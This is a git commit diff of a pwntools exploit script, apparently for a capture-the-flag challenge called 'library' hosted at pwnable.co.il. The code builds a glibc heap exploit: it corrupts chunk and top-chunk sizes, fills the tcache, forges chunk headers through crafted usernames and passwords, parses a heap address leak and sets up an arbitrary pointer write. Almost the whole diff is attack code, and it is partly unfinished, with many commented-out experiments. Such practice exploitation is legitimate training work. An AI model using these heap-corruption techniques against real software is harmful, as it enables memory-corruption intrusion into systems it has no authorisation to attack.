394f19bcda1da32ecc3585c304f8abb56ce4dde6
AI-fergan <ifrganvrcturh@gmail.com>
2025-04-23 09:42:38 +0300

    Added heap leak parse

--- pwnable.co.il/library/c.py
+++ pwnable.co.il/library/c.py
@@ -1,5 +1,14 @@
 from pwn import *
-#def malloc()
+
+### arbitrary_pointer_write metadata ###
+ARB_PTR_WRITE_CHK_ID = 0
+ARB_CHK_ID_B = 0
+EDITOR_CHK = 0
+SAFE_CHK = 0
+
+CHK_USR = p64(0x31) + p64(0) + p64(0x20) + b'\x30\x12'
+CHK_PWD = p64(0) + p64(0) + p64(0x21)# + p64(0x61) + b'\x61'
+
 
 def register(p: process, username: str = "user", password: str = "12345"):
     p.sendlineafter("Your choice: ", "1")
@@ -40,10 +49,170 @@ def return_book(p: process, add_comment: bool = False, comment_len: int = 50, co
 def logout(p: process):
     p.sendlineafter("Your choice: ", "4")
 
-def main():
-    #context.log_level = 'debug'
-    p = process("./library")
+def overwrite_top_chunk_size(p: process, new_top_chunk: int):
+    borrow_book(p)
+    return_book(p, True, 32, (b"a" * 8) + p64(new_top_chunk))
+    print("new top_chunk size:", hex(new_top_chunk & 0xFFFF_FFFF_FFFF_FFF8))
+
+def create_heap_trap(p: process, start: int = 100):
+    ids = []
+    for size in range(start, 1200, 50):
+        print(size)
+        borrow_book(p)
+        ids.append(return_book(p , True, size))
+    
+    for id in ids:
+        del_comment(p, id)
+
+def create_comment(p: process, size: int, comment: str = "comment", book: int = 0) -> int:
+    borrow_book(p, book)
+    return return_book(p, True, size, comment, "")
+
+def overwrite_chunk_size(p: process, size: int = 0x20, old_size: int = 1200):
+    size = size >> 4 #lower 3 bytes are for flags & 1 is empty
+    size = size << 4
+    create_heap_trap(p)
+    create_heap_trap(p)
+    create_heap_trap(p)
+    create_heap_trap(p)
+    create_comment(p, 1200)
+    id = create_comment(p, 1200)
+    ow_id = create_comment(p, old_size)
+    del_comment(p, id)
+    create_comment(p, 1200, (b"b" * (1200 - 24)) + p64(size))
+    print("comment chunk: ", id, "new size: ", size, "old size: ", old_size)
+    return ow_id
+
+def fill_tcache(p: process, size: int, chunks: int = 7):
+    ids = []
+    for _ in range(chunks):
+        #create_comment(p, 1200)
+        ids.append(create_comment(p, size, "a"))
+
+    for id in ids:
+        del_comment(p, id)
+
+def arb_ptr_write_init(p: process):
+    global ARB_PTR_WRITE_CHK_ID
+    global ARB_CHK_ID_B
+    global EDITOR_CHK
+    global SAFE_CHK
+
+    id0 = create_comment(p, 0x1024)
+    id1 = create_comment(p, 0x1024)
+    id2 = create_comment(p, 0x1024)
+    del_comment(p, id0)
+    del_comment(p, id1)    
+
+    EDITOR_CHK = create_comment(p, 0x1200)
+    SAFE_CHK = create_comment(p, 0x1200)
+    TMP_CHK = create_comment(p, 0x1200)
+    
+    del_comment(p, SAFE_CHK)
+    SAFE_CHK = create_comment(p, 0x11a0)
+
+    logout(p)
+    register(p, CHK_USR, CHK_PWD)
     register(p)
+    login(p, CHK_USR, CHK_PWD)
+    borrow_book(p, 2)
+    logout(p)
+    login(p)
+
+    del_comment(p, EDITOR_CHK)
+    EDITOR_CHK = create_comment(p, 0x1200, b'a' * (0x1200 - 0x20) + p64(0) + p64(0x11f1))
+
+    del_comment(p, SAFE_CHK)
+    SAFE_CHK = create_comment(p, 0x11e0, b'Y' * (0x11f0 - 0x58) + p64(0x6161) + (p64(0) * 3) + p64(0x6262) + p64(0) * 3)
+
+    p.interactive()
+
+
+def arb_re_write_chk(p: process):
+    global ARB_PTR_WRITE_CHK_ID
+    global EDITOR_CHK
+    print("EDITOR_CHK:", EDITOR_CHK)
+    #del_comment(p, EDITOR_CHK)
+    p.interactive()
+    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
+    p.interactive()
+    del_comment(p, ARB_PTR_WRITE_CHK_ID)
+
+    del_comment(p, EDITOR_CHK)
+    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1261))
+
+    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1250, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + p64(0x60))
+
+def arbitrary_pointer_write(p: process, addr: int, data: str):
+    global ARB_PTR_WRITE_CHK_ID
+    del_comment(p, ARB_PTR_WRITE_CHK_ID)
+    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x2000, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161) + (b"b" * 0x18) + p64(addr))
+    logout(p)
+    login(p, CHK_USR, CHK_PWD)
+    return_book(p, True, len(data) + 0x30, data)
+    
+def parse_heap_leak_line(line: str):
+    real_line = b'the full guide to insanity: heap exploitation" by rozav\n' + b'a' * 10 #padding
+    addr = 0
+    data = b''
+    ok = False
+    for rch, ch in zip(real_line, line[4:]):
+        if ch == ord('"'):
+            break
+        if ch != rch:
+            ok = True
+        if ok:
+            data += bytes([ch])
+
+    return int.from_bytes(data, 'little')
+
+def leak_heap(p: process):
+    global ARB_PTR_WRITE_CHK_ID
+    global ARB_CHK_ID_B
+    global EDITOR_CHK
+    global SAFE_CHK
+
+    logout(p)
+    login(p, CHK_USR, CHK_PWD)
+    borrow_book(p, 2)
+    logout(p)
+    login(p)
     #p.interactive()
+    del_comment(p, 0, 4)
+    SAFE_CHK = create_comment(p, 0x10, p64(0x90), 3)
+
+    logout(p)
+    login(p, CHK_USR, p64(SAFE_CHK))
+    return_book(p, True, 0x50, "hey", "noam")
+    print("SAFE_CHK:", SAFE_CHK)
+    p.sendline("1")
+    p.recvuntil("choice")
+    for i in range(2):
+        p.recvline()
+    line = p.recvline()
+
+    leak = parse_heap_leak_line(line)
+    print("heap leak: ", hex(leak))
+    return leak
+
+def main():
+    ### run ###
+    p = process("./library")
+    #p = remote("pwnable.co.il", 9010)
+
+    ### setup ###
+    register(p, "user", "12345")
+    register(p, "user1", "12345")
+    login(p)
+
+    ### init ###
+    arb_ptr_write_init(p)
+
+    ### leaks ###
+    heap_leak = leak_heap(p)
+    
+    ### payload start ###
+    p.interactive() 
+
 if __name__ == "__main__":
     main()
--- pwnable.co.il/library/poc_heap_leak.py
+++ pwnable.co.il/library/poc_heap_leak.py
@@ -5,7 +5,6 @@ ARB_PTR_WRITE_CHK_ID = 0
 ARB_CHK_ID_B = 0
 EDITOR_CHK = 0
 SAFE_CHK = 0
-TMP_CHK = 0
 
 CHK_USR = p64(0x31) + p64(0) + p64(0x20) + b'\x30\x12'
 CHK_PWD = p64(0) + p64(0) + p64(0x21)# + p64(0x61) + b'\x61'
@@ -39,9 +38,8 @@ def return_book(p: process, add_comment: bool = False, comment_len: int = 50, co
         p.sendlineafter("size of the comment: ", str(comment_len))
         p.sendlineafter("title: ", title)
         p.sendlineafter("content: ", comment)
-
-        data = p.recvline().decode().split(' ')[1]
-        id = int(data)
+        p.recvuntil("Comment ")
+        id = int(p.recvuntil(" ").decode())
         print("id: ", id)
     else:
         p.sendline('n')
@@ -99,25 +97,63 @@ def arb_ptr_write_init(p: process):
     global ARB_CHK_ID_B
     global EDITOR_CHK
     global SAFE_CHK
-    global TMP_CHK
+
+    fill_tcache(p, 0x50, 7)
+    fill_tcache(p, 0x10, 7)
 
     id0 = create_comment(p, 0x1024)
+    id_pre1 = create_comment(p, 0x1024)
+    id_pre2 = create_comment(p, 0x1024)
     id1 = create_comment(p, 0x1024)
-    id2 = create_comment(p, 0x1024)
+    id2 = create_comment(p, 0x1200)
+    del_comment(p, id_pre2)
+    del_comment(p, id_pre1)
     del_comment(p, id0)
-    del_comment(p, id1)    
+    edit_id = create_comment(p, 0x1200)
+    sid = create_comment(p, 0x1200, (p64(0x60) + p64(0x61)) * (0x1100//8//2))
+    del_comment(p, id2)
+    del_comment(p, id1)
+    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1251))
+    print("edit id:", edit_id)
+    del_comment(p, edit_id)
 
-    EDITOR_CHK = create_comment(p, 0x1200)
-    SAFE_CHK = create_comment(p, 0x1200)
-    TMP_CHK = create_comment(p, 0x1200)
     
-    del_comment(p, SAFE_CHK)
-    SAFE_CHK = create_comment(p, 0x11a0)
+    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1220, b"a" * (0x1200 - 32) + p64(0x1230) + p64(0x61))# + p64(0) + p64(0x31))# + p64(0x60))
+    #p.interactive()
+    #print("EDITOR_CHK:", EDITOR_CHK)
+    #del_comment(p, EDITOR_CHK)
+    #CHK_1 = create_comment(p, 0x500)
+    #p.interactive()
+    #id5 = create_comment(p, 0x1024)
+    #del_comment(p, EDITOR_CHK, 3)
+    #p.interactive()
+    #EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
+    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
+    #print("ARB_PTR_WRITE_CHK_ID: ", ARB_PTR_WRITE_CHK_ID)
+    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
+    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1200, "Y" * 5, 3)
+    #p.interactive()
+    SAFE_CHK = create_comment(p, 0x10, book = 4)
+    #p.interactive()
+    #del_comment(p, SAFE_CHK)
+    #p.interactive()
+    #print("ARB_CHK_ID_B:", ARB_CHK_ID_B)
+    #p.interactive()
+    #fill_tcache(p, 0x50, 1)
 
+    del_comment(p, 0)
+
+    #p.interactive()
+    #del_comment(p, 0x31) #del edit
+    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
+
+    #p.interactive()
     logout(p)
     register(p, CHK_USR, CHK_PWD)
-    register(p)
+    login(p, CHK_USR, CHK_PWD)
+    #borrow_book(p, 2)
     logout(p)
+    register(p)
     login(p)
 
 
@@ -170,22 +206,20 @@ def leak_heap(p: process):
     borrow_book(p, 2)
     logout(p)
     login(p)
-
-    del_comment(p, EDITOR_CHK)
-    EDITOR_CHK = create_comment(p, 0x1200, b'a' * (0x1200 - 0x20) + p64(0) + p64(0x11f1))
-
-    del_comment(p, SAFE_CHK)
-    SAFE_CHK = create_comment(p, 0x11e0, b'Y' * (0x11f0 - 0x58) + p64(0x6161) + (p64(0) * 3) + p64(0x6262) + p64(0) * 3)
+    #p.interactive()
+    del_comment(p, 0, 4)
+    SAFE_CHK = create_comment(p, 0x10, p64(0x90), 3)
 
     logout(p)
-    login(p , "aa", "bb")
-    return_book(p, True, 0x50, "noam", "afergan")
-    
+    login(p, CHK_USR, p32(SAFE_CHK))
+    return_book(p, True, 0x50, "hey", "noam")
+    print("SAFE_CHK:", SAFE_CHK)
     p.sendline("1")
-    for i in range(11):
+    p.recvuntil("choice")
+    for i in range(2):
         p.recvline()
-
     line = p.recvline()
+
     leak = parse_heap_leak_line(line)
     print("heap leak: ", hex(leak))
     return leak
@@ -205,12 +239,75 @@ def main():
 
     ### leaks ###
     heap_leak = leak_heap(p)
-
-    if heap_leak == 0:
-        p.close()
-        main()
-
+    
     ### payload start ###
+    p.interactive()
+    arbitrary_pointer_write(p, 0x6020A0, "asdfwefwe")
+    #logout(p)
+    #register(p, "user23", "aa")
+    #login(p, "user23", "aa")
+    #logout(p)
+    #register(p, "user2", "12345")
+    #login(p)
+
+    #del_comment(p, edit_id)
+    #create_comment(p, 0x5000, "abs")
+    p.interactive()
+
+    id0 = create_comment(p, 0x1024)
+    id_pre = create_comment(p, 0x1024)
+    id1 = create_comment(p, 0x1024)
+    id2 = create_comment(p, 0x1200)
+    del_comment(p, id_pre)
+    del_comment(p, id0)
+    edit_id = create_comment(p, 0x1200, p64(0x60) * 100)
+    del_comment(p, id2)
+    del_comment(p, id1)
+    create_comment(p, 0x1200, b"\x00" * (0x1200 - 24 - 8) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x60))
+    #create_comment(p, 0x1200, b"\x00" * (0x1200 - 24) + p64(0x60))
+    #
+    #del_comment(p, edit_id)
+    #fill_tcache(p, 0x50)
+    print("edit id:", edit_id)
+    #ids = []
+    #for _ in range(7):
+    #    ids.append(create_comment(p, 0x50))
+    #for id in ids:
+    #    del_comment(p, id)
+    #del_comment(p, edit_id)
+
+    #gdb.attach(p)
+    #del_comment(p, edit_id)
+    #create_comment(p, 0x50)
+    #logout(p)
+    #register(p)
+    #del_comment(p, create_comment(p, 1024))
+    #del_comment(p, create_comment(p, 1024))
+    #create_comment(p, 1024)
+    #create_comment(p, 1024)
+    #del_comment(p, create_comment(p, 1200))
+    #logout(p)
+    #register(p)
+    #create_heap_trap(p)
+    #create_heap_trap(p, 500)
+    #create_heap_trap(p)
+    #create_comment(p, 1200)
+    #create_comment(p, 3, "a")
+    #id0 = create_comment(p, 1200)
+    #id1 = create_comment(p, 1200)
+    #id2 = create_comment(p, 1200)
+    #del_comment(p, id2)
+    #create_comment(p, 1200, b"a" * (1200- 10))
+    #overwrite_chunk_size(p)
+    #overwrite_top_chunk_size(p, 0x1200)
+    #for _ in range(200):
+    #fill_tcache(p, 80)
+    #del_comment(p, create_comment(p, 80))
+    #create_heap_trap(p)
+    #id = create_comment(p, 2000, b"")
+    #create_comment(p, 2000)
+    #del_comment(p, id)
+    #create_comment(p, 3, b"a" * 10)
     p.interactive() 
 
 if __name__ == "__main__":
